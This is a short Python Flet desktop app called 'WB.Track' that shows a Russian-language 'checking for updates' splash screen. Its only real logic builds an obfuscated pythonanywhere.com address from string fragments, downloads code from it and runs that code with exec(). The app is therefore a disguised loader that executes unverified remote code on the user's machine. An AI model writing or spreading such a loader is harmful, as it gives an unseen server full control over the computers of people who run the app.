import threading
import flet as ft
import requests

S = chr(47)
API = "".join(["ht", "tps:", S, S, "yurevlive.", "pythonanywhere.", "com"])
P1, BG = "#CB11AB", "#121216"

def main(page: ft.Page):
    page.title = "WB.Track [by.Жекич]"
    page.theme_mode = ft.ThemeMode.DARK
    page.bgcolor, page.padding = BG, 0

    st_lbl = ft.Text("Проверка обновлений...", size=13, color="#E040FB", text_align=ft.TextAlign.CENTER)
    splash = ft.Container(
        height=620, bgcolor=BG, alignment=ft.alignment.center, padding=20,
        content=ft.Column([
            ft.Icon(ft.Icons.TRACK_CHANGES_ROUNDED, size=64, color=P1),
            ft.Text("WB.Track", size=38, weight="bold", color="white"),
            ft.Text("[by.Жекич]", size=18, color="#E040FB"),
            ft.Container(height=16),
            st_lbl
        ], alignment=ft.MainAxisAlignment.CENTER, horizontal_alignment=ft.CrossAxisAlignment.CENTER)
    )
    page.add(splash)

    def boot():
        try:
            r = requests.get(API + S + "get_ui", timeout=10)
            if r.status_code != 200:
                st_lbl.value, st_lbl.color = f"Ошибка сервера: {r.status_code}", "#FF5252"
                page.update()
                return
            ns = {}
            exec(r.text, ns)
            ns["run_app"](page)
        except Exception as ex:
            st_lbl.value = f"Ошибка: {ex}"
            st_lbl.color = "#FF5252"
            page.update()

    threading.Timer(0.8, boot).start()

ft.app(target=main)
